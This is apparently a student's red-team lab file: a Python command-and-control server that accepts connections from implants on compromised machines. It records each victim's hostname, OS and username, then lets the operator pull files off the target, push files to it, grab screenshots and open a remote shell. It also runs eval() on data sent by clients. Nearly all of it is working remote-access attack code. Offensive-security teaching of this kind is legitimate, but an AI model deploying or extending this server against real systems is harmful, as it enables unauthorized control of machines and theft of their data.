from art import *
import socket
import threading
import sys
import time
from prettytable import PrettyTable

connections = []

tprint("Com & conTROLL")

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5050

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to host and port
server_socket.bind((SERVER_HOST, SERVER_PORT))

# Listen for incoming connections
server_socket.listen(5)
# print(f"Server listening on {SERVER_HOST}:{SERVER_PORT}")

def ss(session):
    client_socket = connections[session]['socket']
    path = client_socket.recv(1024).decode()
    print("recieved path")  #TODO DELETE
    print(path) #TODO DELETE

    download_path = 'C:\\Users\\Ziya\\Desktop\\study\\AKM\\RED\\python for red\\lab\\final\\Command-Control\\ss'

    download(from_=path, where=download_path, session=session)
    print("done!")


def shell(session):

    conn = connections[session]['socket']

    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()
        if command == 'exit':
            break

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(0.5)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])


def list():
    table = PrettyTable(["ID", "IP", "port", 'Hostname', 'OS', 'Username'])

    for i in range(len(connections)):
        table.add_row([i,connections[i]['address'][0],connections[i]['address'][1],connections[i]['cred']['hostname'],
        connections[i]['cred']['OS'],connections[i]['cred']['username']])

    print(table)
    
    print("\nUse number for interaction with socket. For example 'use 0'")  #MAKE HERE BEAUTIFUL

    # print(connections)


def session_help():
    print("""
    download    Usage: 'download <from(target's path)> <where(your path)>'
    upload      Usage:  'upload <where(your path)> <from(target's path)>'
    shell       Opens reverse shell on agent      
    exit        exiting from current session
    help        shows this page
    """)


def help():
    print("""
    list    Lists all connected clients                                        
    use     Usage: 'use <number of session>' interracting with specific target    
    help    shows this page    

    """)


def use(session):
    session = int(session)
    if connections[session]:
        client_socket = connections[session]['socket']
        while 1:
            command = input(f"\n[*] You're interacting with {session} Enter command > ")
            if command == 'exit':                         
                break                                           
            
            client_socket.send(command.encode())
            command = command.split(" ")      

            match command[0]:
                case  'download':
                    download(from_=command[1], where=command[2], session=session)
                case 'upload':
                    upload(what=command[1], where=command[2], session=session)
                case 'shell':
                    shell(session=session)
                case 'ss':
                    ss(session=session)
                case 'help':
                    session_help()
                
    else:
        print("ID does not exist!")


def exit():
    server_socket.close()
    time.sleep(1)


def listen_incoming():
    while True:
        # Accept incoming connection    
        client_socket, address = server_socket.accept()
        cred = client_socket.recv(4096).decode()
        cred = eval(cred) #TODO change eval to json.loads
        # connections.append(cred)
        connection = {"address": address, 'socket': client_socket, 'cred':cred}
        connections.append(connection)


def download(from_, where, session):
    socket = connections[session]['socket']
    socket.send(from_.encode())
    time.sleep(0.3)
    file_name = from_.split('\\')[-1]
    if not where.endswith('\\'):
        where += '\\'
    where += file_name
    file = open(where, 'ab')
    a = socket.recv(4096)
    while a != b"\n\r":
        file.write(a)
        a = socket.recv(4096)
    file.close()
    print("File sent succesfully!")


def upload(what, where, session):
    socket = connections[session]['socket']
    # socket.send(where.encode())
    time.sleep(0.3)
    file_name = what.split('\\')[-1]
    socket.send(file_name.encode())
    file = open(what, 'rb')
    a = file.read(4096)
    while a:
        socket.send(a)
        a = file.read(4096)
    time.sleep(1)
    socket.send(b"\n\r")
    file.close()


threading.Thread(target=listen_incoming).start()


while 1:
    command = input("\n[*] Enter command > ")
    
    command = command.split(" ")

    match command[0]:
        case "list":
            list()
        case "help":
            help()
        case 'exit':
            exit()
            break
        case 'use':
            use(command[1])
            

sys.exit()